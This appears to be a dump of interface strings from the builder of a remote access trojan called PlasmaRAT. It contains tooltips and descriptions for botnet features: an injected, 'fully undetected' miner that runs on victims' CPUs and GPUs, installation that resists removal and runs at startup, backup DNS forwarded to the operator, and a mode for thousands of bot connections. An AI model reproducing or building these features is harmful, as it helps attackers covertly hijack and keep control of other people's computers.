data.name: TextBox7.Text
data.value:
FULL Guide and Details Available Here: http://plasma.bz/forums/showthread.php?tid=11
Mines Scrypt-Based Cryptocurrencies such as LiteCoin using bots CPU and GPU. Miner is fully undetected, as files are injected. Settings are automatically adjusted based on PC specifications.
To use, just insert your information and hit "Start Mining."
Select "GPU Miner" and then "Start Mining on Bots" to use the GPU Miner.
The miner will restart after a reboot. You can update miner information, or disable the miner at anytime.

data.name: EnableBackupDNS.ToolTip
data.value:
The bot will attempt to connect to both the default DNS, and the backup DNS.
Pleae ensure both are properly forwarded to your IP.
NOTICE: Do not use the same No-IP Account or DNS provider for the backup DNS.

data.name: EnableInstallation.ToolTip
data.value:
Installs the Bot and prevents removal using numerous private techniques. Automatically runs at startup.
The new installation is 100% fail proof. In the event installation fails, Plasma will install its original executed location.

data.name: LowBandwidth.ToolTip
data.value:
Greatly reduces the bandwidth usage of PlasmaRAT to allow for thousands of concurrent connections without issue.
This will automatically mute bots as they join, meaning they will not report anything to Bot Logs.
Although the Ping/Pong system will still function, this slows down the ping/pong time.

data.name: PingPong.ToolTip
data.value:
Allows for the connection class to better detect unexpected disconnects between the server and the client.
Is delayed (of course), but properly disconnects clients that are found non-responding after a period of time.
